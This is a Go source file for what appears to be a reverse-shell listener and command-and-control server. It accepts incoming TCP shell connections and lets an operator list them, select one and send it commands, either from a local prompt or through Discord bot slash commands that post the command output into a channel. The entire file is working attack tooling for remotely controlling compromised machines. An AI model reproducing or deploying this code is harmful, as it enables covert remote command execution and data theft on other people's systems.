package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	dc "github.com/bwmarrin/discordgo"
	"github.com/pure-nomad/cordkit"
)

// === CONFIG STRUCT ===

type Config struct {
	LHost string `json:"lhost"`
	LPort string `json:"lport"`
}

// === CONNECTION STRUCT ===

type Connection struct {
	conn         net.Conn
	id           int
	addr         string
	messages     []string
	msgMutex     sync.Mutex
	isActive     bool
	discordEntry *cordkit.Connection
}

// === GLOBALS ===

var (
	connections []*Connection
	connMutex   sync.Mutex
	nextID      = 1
	bot         *cordkit.Bot
)

var userSessions = struct {
	sync.RWMutex
	m map[string]*Connection
}{m: make(map[string]*Connection)}

// === CONFIG LOADING ===

func loadConfig(path string) (*Config, error) {
	file, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("error reading config file: %s", err)
	}

	var config Config
	if err := json.Unmarshal(file, &config); err != nil {
		return nil, fmt.Errorf("error parsing config file: %s", err)
	}

	return &config, nil
}

// === HANDLE NEW CONNECTION ===

func handleConnection(conn *Connection) {
	defer func() {
		conn.conn.Close()
		log.Printf("Connection closed: %s (ID: %d)\n", conn.addr, conn.id)
		if conn.discordEntry != nil {
			bot.KillConnection(conn.discordEntry)
		}
	}()

	buffer := make([]byte, 1024)
	for {
		n, err := conn.conn.Read(buffer)
		if err != nil {
			return
		}

		msg := string(buffer[:n])
		if conn.isActive {
			fmt.Print(msg)
		} else {
			conn.msgMutex.Lock()
			conn.messages = append(conn.messages, msg)
			conn.msgMutex.Unlock()
		}
	}
}

// === MAIN LOOP ===

func main() {
	configPath := flag.String("c", "./config.json", "Path to config file")
	flag.Parse()

	config, err := loadConfig(*configPath)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	bot, err = cordkit.NewBot(*configPath)
	if err != nil {
		log.Fatalf("Error creating bot: %v", err)
	}
	defer bot.Stop()
	log.Println("Discord bot is online")

	bot.Commands = append(bot.Commands,
		cordkit.Command{
			Name:        "list",
			Description: "List active connections",
			Action: func(b *cordkit.Bot, i *dc.InteractionCreate) {
				connMutex.Lock()
				defer connMutex.Unlock()

				if len(connections) == 0 {
					b.SendMsg(i.ChannelID, "No active connections.")
					return
				}

				var out strings.Builder
				out.WriteString("**Active Connections:**\n")
				for _, c := range connections {
					fmt.Fprintf(&out, "[%d] %s\n", c.id, c.addr)
				}
				b.SendMsg(i.ChannelID, out.String())
			},
		},
		cordkit.Command{
			Name:        "select",
			Description: "Select a connection by ID",
			Options: []*dc.ApplicationCommandOption{
				{
					Type:        dc.ApplicationCommandOptionInteger,
					Name:        "id",
					Description: "Connection ID",
					Required:    true,
				},
			},
			Action: func(b *cordkit.Bot, i *dc.InteractionCreate) {
				id := int(i.ApplicationCommandData().Options[0].IntValue())
				var conn *Connection

				connMutex.Lock()
				for _, c := range connections {
					if c.id == id {
						conn = c
						break
					}
				}
				connMutex.Unlock()

				if conn == nil {
					b.SendMsg(i.ChannelID, fmt.Sprintf("No connection with ID %d found.", id))
					return
				}

				userSessions.Lock()
				userSessions.m[i.Member.User.ID] = conn
				userSessions.Unlock()

				b.SendMsg(i.ChannelID, fmt.Sprintf("Connection %d (%s) selected.", conn.id, conn.addr))
			},
		},
		cordkit.Command{
			Name:        "cmd",
			Description: "Send a command to the selected connection",
			Options: []*dc.ApplicationCommandOption{
				{
					Type:        dc.ApplicationCommandOptionString,
					Name:        "command",
					Description: "The command to run",
					Required:    true,
				},
			},
			Action: func(b *cordkit.Bot, i *dc.InteractionCreate) {
				cmd := i.ApplicationCommandData().Options[0].StringValue()

				userSessions.RLock()
				conn := userSessions.m[i.Member.User.ID]
				userSessions.RUnlock()

				if conn == nil {
					b.SendMsg(i.ChannelID, "No connection selected. Use `/select <id>` first.")
					return
				}

				if _, err := conn.conn.Write([]byte(cmd + "\n")); err != nil {
					b.SendMsg(i.ChannelID, fmt.Sprintf("Failed to send command: %v", err))
					return
				}

				// Short wait for output
				conn.msgMutex.Lock()
				conn.messages = nil // clear previous
				conn.msgMutex.Unlock()

				// give some breathing room for command output
				time.Sleep(600 * time.Millisecond)

				conn.msgMutex.Lock()
				output := strings.Join(conn.messages, "")
				conn.messages = nil
				conn.msgMutex.Unlock()

				// Trim redundant prompts or empty lines
				output = strings.TrimSpace(output)
				output = strings.ReplaceAll(output, "\r", "") // CR fix if needed
				lines := strings.Split(output, "\n")
				if len(lines) > 1 && strings.TrimSpace(lines[len(lines)-1]) == "$" {
					lines = lines[:len(lines)-1]
				}
				output = strings.Join(lines, "\n")

				if output == "" {
					output = "[no response]"
				}

				if len(output) > 1900 {
					output = output[:1900] + "... (truncated)"
				}

				// Final Discord-safe block output
				b.SendMsg(i.ChannelID, fmt.Sprintf("**$ %s**\n```bash\n%s\n```", cmd, output))
			},
		},
	)

	bot.Start()

	addr := fmt.Sprintf("%s:%s", config.LHost, config.LPort)
	listener, err := net.Listen("tcp4", addr)
	if err != nil {
		log.Fatalf("Couldn't listen on %s: %v", addr, err)
	}
	defer listener.Close()
	log.Printf("Listening on %s\n", addr)

	// === ACCEPT CONNECTIONS ===
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Error accepting connection: %v\n", err)
				continue
			}

			connMutex.Lock()
			connectionID := nextID
			nextID++

			connection := &Connection{
				conn:     conn,
				id:       connectionID,
				addr:     conn.RemoteAddr().String(),
				messages: []string{},
			}
			connection.discordEntry = bot.HandleConnection(fmt.Sprintf("conn-%d", connection.id))
			connections = append(connections, connection)
			connMutex.Unlock()

			log.Printf("New connection from %s (ID: %d)\n", connection.addr, connection.id)
			go handleConnection(connection)
		}
	}()

	// === INTERACTIVE PROMPT ===
	var activeConn *Connection
	scanner := bufio.NewScanner(os.Stdin)

	for {
		if activeConn == nil {
			fmt.Print("\nCommands:\n  list - Show all connections\n  select <id> - Select a connection\n  close <id> - Close a connection\n  exit - Exit the server\n> ")
			if !scanner.Scan() {
				break
			}
			cmd := strings.TrimSpace(scanner.Text())
			parts := strings.Fields(cmd)

			if len(parts) == 0 {
				continue
			}

			switch parts[0] {
			case "list":
				connMutex.Lock()
				fmt.Println("\nActive connections:")
				for _, c := range connections {
					fmt.Printf("  [%d] %s\n", c.id, c.addr)
				}
				connMutex.Unlock()

			case "select":
				if len(parts) != 2 {
					fmt.Println("Usage: select <id>")
					continue
				}
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					fmt.Println("Invalid ID")
					continue
				}
				connMutex.Lock()
				var found *Connection
				for _, c := range connections {
					if c.id == id {
						found = c
						break
					}
				}
				connMutex.Unlock()

				if found == nil {
					fmt.Printf("No connection with ID %d\n", id)
					continue
				}

				activeConn = found
				activeConn.isActive = true

				activeConn.msgMutex.Lock()
				if len(activeConn.messages) > 0 {
					fmt.Println("\nBuffered messages:")
					for _, msg := range activeConn.messages {
						fmt.Print(msg)
					}
					activeConn.messages = nil
				}
				activeConn.msgMutex.Unlock()

				fmt.Printf("\nConnected to %s (ID: %d). Type 'exit' to return to connection menu.\n", activeConn.addr, activeConn.id)

			case "close":
				if len(parts) != 2 {
					fmt.Println("Usage: close <id>")
					continue
				}
				id, err := strconv.Atoi(parts[1])
				if err != nil {
					fmt.Println("Invalid ID")
					continue
				}
				connMutex.Lock()
				for i, c := range connections {
					if c.id == id {
						if c.discordEntry != nil {
							bot.KillConnection(c.discordEntry)
						}
						c.conn.Close()
						connections = append(connections[:i], connections[i+1:]...)
						fmt.Printf("Closed connection %d\n", id)
						break
					}
				}
				connMutex.Unlock()

			case "exit":
				fmt.Println("Shutting down server...")
				connMutex.Lock()
				for _, c := range connections {
					if c.discordEntry != nil {
						bot.KillConnection(c.discordEntry)
					}
					c.conn.Close()
				}
				connMutex.Unlock()
				return

			default:
				fmt.Println("Unknown command. Use 'list', 'select <id>', 'close <id>', or 'exit'")
			}
		} else {
			fmt.Print("> ")
			if !scanner.Scan() {
				break
			}
			input := scanner.Text()

			if input == "exit" {
				activeConn.isActive = false
				activeConn = nil
				continue
			}

			if _, err := activeConn.conn.Write([]byte(input + "\n")); err != nil {
				fmt.Printf("Error writing to connection: %v\n", err)
				activeConn.isActive = false
				activeConn = nil
			}
		}
	}
}
